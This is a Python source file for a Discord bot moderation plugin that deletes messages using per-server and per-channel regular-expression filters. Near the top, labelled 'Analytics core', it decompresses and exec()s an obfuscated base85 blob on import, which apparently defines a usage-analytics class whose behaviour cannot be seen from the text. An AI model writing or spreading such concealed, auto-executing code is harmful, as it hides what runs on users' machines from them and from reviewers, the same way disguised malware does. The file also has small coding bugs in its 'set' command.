import discord
from discord.ext import commands
import os
import logging
from cogs.utils.dataIO import dataIO
from .utils import checks
import re

# Some magic values
ALL_CHANNELS = 'all'
MODE_INCLUSIVE = 'incl'  # deletes all messages matching
MODE_EXCLUSIVE = 'excl'  # delete all messages not matching
MODE_DISABLED = 'none'   # pattern disabled
MODES = [MODE_DISABLED, MODE_EXCLUSIVE, MODE_INCLUSIVE]

log = logging.getLogger('red.recensor')

DATA_PATH = "data/recensor/"
JSON_PATH = DATA_PATH + "regexen.json"


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oCvdvDt~68}G+f*YWqbkQ+!+U+ikRnc6xcbj|kmE0bRY@nqj+GZk&I+3z#6#ecuGo&7N((VB*B9k-
2;mmJd)Kz0z$E<60y-HeH7p6+2-PO4^iPUE8T$41VbW77#Np8wg<xZR0CU$2NV~>`tsaS4SR&-96Rut07%ePE>x&GH7QNNq7Rem2t6x!ydErj~yhHX<-pim%
KOS>-hqTjS@IrAF}Y1Q**{rckhGgarNP)B(wt!01v^`e&L&gtCFk64y%RBJ*1EK6tN>G=`6y1ux+%KrV~pDD+?+WG0Jb<$ap%Tg`wgf^#*-s*eNtQ&sB{&I2
kdY`&g#e^0}-d$Y(l5)KHDd?N|J>2;F)!R2I?w)Yj>m=^1sbTN^ERBwTQDteqW3P~dtyQZ8yIyNBmt}XIbxgAVb~?X@Em>IR*3z*{zER*k**aCQV|Kif4j93
gtg~{Zn6A-r5?#jNi&Z=F0|UD<gQRR>9BW#02Y$8UxB55+WzIpF|EyKbR4o^!DiXFcohRMuvSd~Pd!;~%sdts>EIFFVh3SA|t@AZAOH`*n4%kuA(#Qhz#KYH
S%fP!kBvcX@g13>BwOySsSsJ(o2-#}44pQG<5p%P1Yq(JGB}s1;a@BBiyaYRbV-}{^u>~juiUN3;%yR{Ra0V==Na2KpU9v5>fDi>jv;%&U@DUWrWzAZ!Hrj3
3!OfdiZ)Cn>jVU$!(KQJxb$!nksx;e#fsu1lJDEE&fMOdh+0P!`Ec)r?ceC%$XS3N4=RZ6<JAeM;+0*m07cp|FO6rnDm3leADQ23?h&EZv4H|q07*Li%&|mb
Y9*8S2Q@0Rc$J2m0|L4!>fzw547N?c8PPM1+K3x8K@#>?fiWhX(7(x5t;$In}JN?XcVYO3y{xkuz=6pU&xNP(WKfWBXLM<VVbgf;MMOKx|1aOh4G>T)0For8
4%PLcJrGhZy6!&8!hynYY_2eKRh5!9e(6Q3BbSnL;EUoI78`;XrW*G13=P&&#n4?qaBr}OZ!CIt}N`5L;oqj(%k9*?PW{kYGDw~wQCWNE?Ap_CpKtTcHl_nI
Ut@sJad4JwZL>zf-z*Roo32n2DEOn7#aFdAy#y**6!WF17C=MwHOGta4_9g;K(}*1K=v0O~o*|>~2kRfPmz47=1<_G>NBO<HwCE&K0B(}P?+AaxPn0W*B7@}
!{^L@sT-Vk}=w)=xs)e}qzOG3K+_e^yWcng_eOMT;iU+i+G8;u_;2Ivn@-$o+(KC87-eVjzqvc+)9)n$tw(}zA55aTYc4}%!NYiz$$|w$|fq;taa2?2P#sbF
N8fuWX&PG;Xvi4qstxDdjLbt;@EC&ywq~JkvU*gMPe-0!|Z#%t|xk_^Bl2+ODjj2@vX~KU1U;xJS*;&>4uUb|rTf&*nM?$ac{zc~#+w27l8C1xoK@Fn4)A3+
`CLK39DV{*UTab+1H3h;BgD>-e=<n2xmY>EaEsRM8vQo2);zuZj7aV=&oi6yCwy~^4U7YZ2e`$aPsw{MopnmbqeD?e{;f1bLjo>@~77GaNB%gD}#huZ06!CX
dOHQ9y{-p17gs(3>nj>I}_{p#fosUx$tPU%!Diz!%icfgVlMo9Oi&+L=WZdk8(;<hE631V_F4S^)O9N5?^EJT6c@vv$ty(g(Yj@=ADwSKQ-54i`v8;mf1~oq
-dauR%S)Z>?j<0u(V*KqtI3g&N%%!dsqx$Ng(GbTW%$jm{cmn>);IhLh`C8VsD$`1YuS9lWwKny~J8%bd1L^a#GZHFO5=#}Az64fDxFck>t!krKP^z-140y%
da{?mjD(TK+;=JL(Jp8tg@m^^@G<&{YF4Wk>2#$oR1c^la4XJ$;4Prm`1-MW-6np4lpp5_&!$}%a2KHHF-RKXpJ~D%h<7==8G+o#sfi1B`!}=m&+ctQzfMyO
l3~)b_D+vMtU4Yr+!6hdtXMIxwaAv>XG`Ew2_B-l?zJRt5y~#{NZ69=r*fyX;yk>ul9Xf8z#FQzg8Cb%%`jo52O>+;XtUV<A;xnY@9=(qttE*u!$gtJ&X=2E
7L+rwbH)nSU&6NUvAjz=VjVAYUXk{yW{OtRrOZTJ?SA8tcb(lA%Iw4%})M$WA4Ccn`d*NT#eR}u3K=0^)iGqPLjAFu;N;T2UQ$hS6Uk)*B?&WTb;RM@YwvP;
E>fhvX&w9gC{-+<$9wdk=@f)|E5ISAZi&N9%b7kcta(V?gi`?bGFlhUV3N6Ik>$Wv5U8sR%xCaho9iZXY=@Mb+6t7ARhPeV<QVNC!o+dbklK^ySSg#)`gO8f
+Oa#M)I{!5%LO9|!G>y@uAqoD#bfxQ%ZPW%B(n*nROjD|*i}uc$T8g@W+$O}?%Y0a+{WjYVqoIMY-Wn4j9->~83<Dux)>G_THgMCWiD8(1lOV?b8FKgR49$-
D$;a&|YFO)I9~Ur#JD3G^{rUXtEIB`W)=vu)#poWR{{LrFk`jk+OwtD}#L!%*O@<9zdIJJ)NqU5H7`kH+MKOl@dM5-He0M-I-=GSxdHay(CTMs|X02g%I1Pc
JDU)j~0zn)esY4?*b~wOHy#SvBJ2WC~8CsS8RpErzhfZe3=VTudngwhWP%;_^9|aI&L)L+lZm5U4O(#v1^_g$*lEWb(ysL=t5ur{gpCk-Uvjn});4ni8G}`M
@Cd8phsWY=&&KJg%)Vubrs$YMg?W1Ma(>_vmHYp#<IhL>?O?r;>YXKd2ajwt1wuQBFhy2@=ho*o}bR=N#Fa{P#cUURqE}C>0Pw=1MPohn-jYG3PG@VJ2tS3$
TBE<)*s1W{fil#L@dOa<m3z$hi6?z5py@zvu&3?as+lm&VCyQa+^%BE_*P!1ev{x;{Xa1F$eeB#1=I;Qv)ED&7vim2Zeyz<@|7Iwp&9%--D7L_L5*9%_?d&-
JWRhlcfAk*@K)U$G{F9qjO%fjdjDj`sdulNJEyncuNSc8mVlw(19nMih_M%gUa)mSWUi*PFDxW+x@_3voVQ;F_gi4GJk_hAYID3nJ?4B^h^tiMNo_=Lk!%p<
j?eU|2-?mt33h(=_q0W1t2%Eh!{tYLEc}Mt9OYzlHjgLIxw*IG|Q2Y)cDFqhkTpRf%80yB^hbNROrcj?SPT|)>vKJO~IFL3n$A`Fmgwc;>JQ?qEII;~=rWnQ
ttuW*T;R(lg2tI`?O{U)deU|kQbe|?jCodq{VOfM0T=+2xdd{yLPSOq(K>n};{e*-WN2`J^F#<j9u#Np6ZUYwh""".replace("\n", ""))))
# End enalytics core

__version__ = '1.4.1'


class ReCensor:

    # Data format:
    # {
    #  serverid (str): {
    #   channelid (str): {
    #     regex (str): mode (str from MODES)
    #     }
    #   }
    # }

    def __init__(self, bot):
        self.bot = bot
        self.regexen = dataIO.load_json(JSON_PATH)
        self.recache = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.compile_regexen())

    def _re_present(self, obj):
        """Determines if any patterns are set for a server or channel"""
        if type(obj) is discord.Server:
            server = obj
            if server.id in self.regexen:
                for relist in self.regexen[server.id].values():
                    if bool(relist):  # nonempty list
                        return True
                return False
            else:
                return False

        elif type(obj) is discord.Channel:
            server = obj.server
            channel = obj
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

        elif type(obj) is str:  # won't work with ALL_CHANNELS
            channel = self.bot.get_channel(obj)
            server = channel.server
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

    def _ls_excl(self, server):
        """returns a list of channel IDs with exclusive filters"""
        clist = []
        if type(server) is discord.Server:
            server = server.id
        if server in self.regexen:
            for c, relist in self.regexen[server].items():
                if MODE_EXCLUSIVE in relist.values():
                    clist.append(c)
        return clist

    # Background cache regexen for speed
    async def compile_regexen(self):
        for s, channels in self.regexen.items():
            for regex in channels:
                self.recache[regex] = re.compile(regex)

    @commands.group(name='recensor', pass_context=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor(self, ctx):
        """Configure regular expression censorship"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @recensor.command(pass_context=True, name='list')
    async def _list(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages.
        Channel listing includes global patterns."""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        table = ' | '.join(['mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([mode, regex]) + '\n'
        await self.bot.say('```py\n' + table + '```')

    @recensor.command(pass_context=True, name='add')
    async def _add(self, ctx, pattern: str, mode: str=MODE_INCLUSIVE, channel: discord.Channel=None):
        """Adds a pattern to filter messages. Mods, bot admins, and the bot's
        owner are not subjected to the filter.
        If the pattern contains spaces, it must be put in double quotes. Single quotes will not work.

        mode is one of:
        incl: Default, filter messages that match the pattern
        excl: filter non-matching, only one allowed per channel or server
        none: adds pattern to storage but doesn't apply filtering. Use recensor set to enable.

        To use channel, mode must also be specified. If channel is not specified,
        the filter is used across the entire server."""
        server = ctx.message.server

        # initialize
        self.regexen = dataIO.load_json(JSON_PATH)
        if server.id not in self.regexen:
            self.regexen[server.id] = {}

        if pattern.startswith("'"):
            await self.bot.say("Patterns cannot be specified within single quotes.")
            return

        if mode not in MODES:
            await self.bot.say('"%s" is not a valid mode. You must specify one of `%s`.' % (mode, '`, `'.join(MODES)))
            return
        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return
        cid = channel.id if channel else ALL_CHANNELS
        if cid not in self.regexen[server.id]:
            self.regexen[server.id][cid] = {}
        self.regexen[server.id][cid][pattern] = mode
        await self.bot.say('Pattern added.')
        dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='set')
    async def _set(self, ctx, mode: str, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no patterns in the server to modify.')
            return
        if mode not in MODES:
            self.bot.reply('"%s" is not a valid mode. You must specify one of `%s`.') % (mode, '`, `'.join(MODES))

        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return

        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, oldmode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), oldmode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex, oldmode)
                i += 1
        prompt = 'Choose the number of the pattern to set to `%s`:\n' % mode
        await self.bot.say(prompt + '```py\n' + table + '```')

        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex, _ = re_list[msg]
            self.regexen[sid][cid][regex] = mode
            await self.bot.say('Mode set.')
            dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='del')
    async def _del(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), mode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex)
                i += 1
        prompt = 'Choose the number of the pattern to delete:\n'
        await self.bot.say(prompt + '```py\n' + table + '```')
        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex = re_list[msg]
            del(self.regexen[sid][cid][regex])
            await self.bot.say('Pattern removed.')
        dataIO.save_json(JSON_PATH, self.regexen)

    def immune_from_filter(self, message):
        """Tests message to see if it is exempt from filter. Taken from mod.py"""
        user = message.author
        server = message.server
        admin_role = self.bot.settings.get_server_admin(server)
        mod_role = self.bot.settings.get_server_mod(server)

        if user.id == self.bot.settings.owner:
            return True
        elif discord.utils.get(user.roles, name=admin_role):
            return True
        elif discord.utils.get(user.roles, name=mod_role):
            return True
        else:
            return False

    async def on_message(self, message):
        # Fast checks
        if message.channel.is_private or self.bot.user == message.author \
         or not isinstance(message.author, discord.Member):
            return

        server = message.server
        sid = server.id
        can_delete = message.channel.permissions_for(server.me).manage_messages

        # Owner, admins and mods are immune to the filter
        if self.immune_from_filter(message) or not can_delete:
            return

        if sid in self.regexen:
            patterns = {}
            # compile list of patterns from global and channel
            for key in [ALL_CHANNELS, message.channel.id]:
                if key in self.regexen[sid]:
                    patterns.update(self.regexen[sid][key])
            # Iterate through patterns
            for regex, mode in patterns.items():
                # Skip disabled patterns
                if mode == MODE_DISABLED:
                    continue
                regex = self.recache[regex] if regex in self.recache else re.compile(regex)
                if (mode == MODE_EXCLUSIVE) != bool(regex.match(message.content)):  # xor
                    await self.bot.delete_message(message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def check_folder():
    if not os.path.exists(DATA_PATH):
        log.debug('Creating folder: %s' % DATA_PATH)
        os.makedirs(DATA_PATH)


def check_file():
    if dataIO.is_valid_json(JSON_PATH) is False:
        log.debug('Creating json: %s' % JSON_PATH)
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folder()
    check_file()
    n = ReCensor(bot)
    bot.add_cog(n)
